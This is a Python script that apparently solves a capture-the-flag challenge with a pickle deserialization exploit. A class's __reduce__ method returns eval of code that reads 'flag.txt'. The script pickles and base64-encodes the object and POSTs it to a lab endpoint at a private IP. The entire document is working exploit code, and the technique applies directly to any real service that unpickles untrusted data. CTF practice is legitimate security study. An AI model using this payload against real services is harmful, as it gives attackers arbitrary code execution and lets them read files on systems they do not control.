import base64
import pickle
import requests

# Define a custom class or object that will be pickled
class ReadFlagPayload(object):
    def __reduce__(self):
        # This method is called during the unpickling process
        # Here, we return a tuple (function, arguments) that will be called
        # Example below reads the contents of 'flag.txt'
        return (eval, ("open('flag.txt', 'r').read()",))

# Create an instance of the payload
payload = ReadFlagPayload()

# Serialize (pickle) the payload
pickled_data = pickle.dumps(payload)

# Base64 encode the pickled data
encoded_data = base64.urlsafe_b64encode(pickled_data).decode()

# URL for the CTF challenge secret endpoint
url = 'http://192.168.59.128/secret-endpoint'

# Prepare the POST request data
data = {
    'data': encoded_data
}

# Send the POST request
response = requests.post(url, json=data)

# Print the response from the server
print(response.text)
